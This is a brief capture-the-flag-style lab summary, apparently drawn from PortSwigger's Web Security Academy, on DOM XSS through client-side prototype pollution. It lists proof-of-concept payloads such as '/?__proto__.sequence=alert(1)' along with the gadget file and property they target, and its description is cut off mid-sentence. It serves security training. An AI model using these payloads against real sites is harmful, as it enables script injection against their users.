## DOM XSS via an alternative prototype pollution vector

**Category:** prototype_pollution
**Difficulty:** Unknown

### Description
This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:

### Solution Steps
Pay attention to the
XSS context
. You need to adjust your payload slightly to ensure that the JavaScript syntax remains valid following your injection.

### Key Payloads
- `Object.prototype`
- `alert()`
- `/?__proto__[foo]=bar`
- `/?__proto__.foo=bar`
- `eval()`
- `searchLoggerAlternative.js`
- `manager.sequence`
- `sequence`
- `/?__proto__.sequence=alert(1)`
- `alert(1)1`

### Indicators of Success
- __proto__ or constructor.prototype modified
- Pollution affects application behavior
- XSS triggered via polluted property
- Server-side pollution causes RCE
- Gadget chain executes
---
*Source: PortSwigger Web Security Academy*
